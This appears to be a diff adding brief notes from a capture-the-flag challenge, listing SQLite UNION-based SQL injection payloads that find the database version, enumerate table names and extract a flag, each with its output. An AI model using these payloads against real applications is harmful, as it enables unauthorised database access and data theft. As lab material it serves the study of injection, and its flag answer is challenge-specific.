@@ -1,0 +1,13 @@
+1:
+the ' so its good
+2:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
+3:
+' UNION select sqlite_version(),1 --
+=> “1” - 3.34.1
+4:
+' UNION SELECT tbl_name,77 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
+=>my_s3cr3t_7abl3
+6:
+' union select flag,56 from my_s3cr3t_7abl3--
+=>“56” - FLAG-th4nk$_f0r_1nj3ct1ng_th3_v4x
